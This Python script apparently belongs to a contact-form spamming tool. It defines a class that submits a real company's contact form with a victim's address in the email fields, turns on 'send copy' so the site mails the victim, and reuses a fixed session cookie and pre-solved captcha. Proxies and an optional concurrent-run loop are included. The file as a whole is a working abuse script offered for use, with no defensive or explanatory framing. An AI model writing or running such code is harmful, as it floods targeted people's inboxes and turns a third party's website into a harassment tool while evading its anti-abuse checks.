from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'PHPSESSID': '2982d800f5e049d663b982b45ebaf7a1',
            '_ga': 'GA1.2.1986526677.1677576942',
            '_gid': 'GA1.2.976895620.1677576942',
            '_gat': '1',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            # 'Cookie': 'PHPSESSID=2982d800f5e049d663b982b45ebaf7a1; _ga=GA1.2.1986526677.1677576942; _gid=GA1.2.976895620.1677576942; _gat=1',
            'Origin': 'https://www.hlb-jobcode.it',
            'Pragma': 'no-cache',
            'Referer': 'https://www.hlb-jobcode.it/contact-us/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'fieldName': self.get_text(),
            'fieldCompanyName': self.get_text(),
            'fieldEmail': target,
            'fieldCity': 'test',
            'fieldCountry': 'test',
            'fieldSubject': self.get_text(),
            'fieldMessage': 'test',
            'fieldSendCopy': 'yes',
            'captcha_1': '747366011',
            'captcha': 'rvyfwc',
            'contact_us_form': '',
            'enter_your_email_for_get_notification': target,
            'contact-us': '',
        }

        response = requests.post('https://www.hlb-jobcode.it/contact-us/', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())
        return response


def main():
    s = 'succesfully'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(10)


if __name__ == '__main__':
    main()
